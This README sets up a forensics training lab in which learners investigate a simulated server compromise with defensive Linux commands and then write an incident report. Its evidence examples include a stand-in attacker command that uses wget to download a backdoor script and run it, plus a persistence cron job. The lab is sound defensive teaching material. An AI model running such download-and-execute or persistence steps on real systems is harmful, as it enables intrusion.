# 🔍 GLOBOMANTICS FORENSICS LAB

## Scenario

A Globomantics server has been **compromised approximately 1 hour ago**. 

Your mission is to **investigate the server** and answer:
- When did the attack begin?
- How did the attacker get in?
- What did they do?
- Which files were modified?
- Is the attacker still there?

---

## How It Works

### ✅ What You DO:
- SSH into the server
- Read logs and files
- Investigate evidence
- Write a report

### ❌ What You DON'T do:
- Don't execute scripts
- Don't modify anything
- Don't delete logs
- Don't connect to processes

---

## Quick Start

### 1. Create Infrastructure
```bash
cd terraform
terraform init
terraform apply
```

### 2. Connect to Server
```bash
export SERVER_IP=$(terraform output -raw server_ip)
ssh -i terraform/keys/globomantics.pem ubuntu@$SERVER_IP
```

### 3. Investigate (Step by Step)

#### STEP 1: Current Status
```bash
who
date
uptime
```

#### STEP 2: Investigate Logins
```bash
last -f /var/log/wtmp
sudo lastb -f /var/log/btmp
sudo cat /var/log/auth.log | tail -50
```

#### STEP 3: Investigate History
```bash
cat ~/.bash_history
sudo cat /root/.bash_history
```

#### STEP 4: Suspicious Files
```bash
find / -mmin -60 2>/dev/null
ls -lart /tmp/
find /tmp -type f -newer /etc/hostname
```

#### STEP 5: Active Processes
```bash
ps aux
netstat -tlnp 2>/dev/null
ss -tlnp 2>/dev/null
```

#### STEP 6: Cron Jobs
```bash
sudo crontab -l
crontab -l
sudo cat /etc/crontab
ls -la /etc/cron.d/
```

### 4. Write Report

Create a file `INCIDENT_REPORT.md` answering:

1. **WHEN did it start?**
   - Exact time of first suspicious login

2. **HOW did they get in?**
   - Attacker IP
   - Method (SSH brute force, vulnerability, etc)

3. **WHAT did they do?**
   - List of commands in order
   - Files created/modified

4. **WHICH files were changed?**
   - File paths
   - Creation/modification times

5. **IS the attacker still there?**
   - Active attacker processes?
   - Installed backdoors?

---

## What You Will Find

### 📋 Attack Logs
Location: `/var/log/auth.log`

You will see:
- Failed login attempts
- Eventual successful login
- Exact time of access

### 📝 Command History
Location: `/home/ubuntu/.bash_history` and `/root/.bash_history`

You will see:
- Commands executed by attacker
- Order of actions
- Privilege escalation attempts

### 📂 Suspicious Files
Location: `/tmp/` and `.hidden/`

You will see:
- Backdoor scripts
- Attack tools
- Stolen data

### ⏰ Cron Jobs
Location: `/var/spool/cron/crontabs/`

You will see:
- New jobs created by attacker
- Persistence mechanisms

---

## Project Structure

```
forensics-lab/
├── terraform/
│   ├── main.tf           (AWS Infrastructure)
│   ├── variables.tf      (Configuration)
│   ├── user-data.sh      (Simulates attack)
│   └── keys/             (Generated SSH keys)
├── README.md             (This file)
├── SOLUCAO.md            (Expected solutions)
└── PLURALSIGHT_SUBMISSION.md (Submission answers)
```

---

## Time Estimate

| Phase | Time |
|-------|------|
| Terraform setup | 5 min |
| SSH + initial exploration | 3 min |
| Investigation | 15-20 min |
| Write report | 5-10 min |
| **Total** | **25-40 min** |

---

## Cleanup

```bash
cd terraform
terraform destroy
```

---

## Concepts You Will Learn

✅ Security log analysis
✅ Linux forensic investigation
✅ Attack artifact identification
✅ Incident timeline creation
✅ Backdoor detection
✅ Forensic documentation

---

## Evidence Examples

### 1. Suspicious Login
```
Invalid user attacker from 203.45.67.89 port 54321
Failed password for ubuntu from 203.45.67.89 port 54323
Accepted password for ubuntu from 203.45.67.89 port 54330
```

### 2. Executed Commands
```
wget https://malicious-domain.com/backdoor.sh
chmod +x backdoor.sh
./backdoor.sh
crontab -e
```

### 3. Created Files
```
/tmp/.hidden/monitor.sh
/tmp/update.py
/tmp/.dataexport
/tmp/sudo_abuse
```

### 4. Suspicious Cron Job
```
*/15 * * * * /tmp/.hidden/monitor.sh
```

---

## Investigation Tips

1. **Look for time changes**: Files modified around 1 hour ago
2. **Follow the IP**: Does the same IP appear in multiple logs?
3. **Search for "sudo"**: Privilege escalation is common
4. **Check /tmp**: Attackers often use /tmp for files
5. **Look for cron jobs**: Common persistence mechanism
6. **Check for new users**: `cat /etc/passwd`

---

**Good luck with your investigation! 🔍**

Remember: You are an Incident Response Engineer. Document everything.
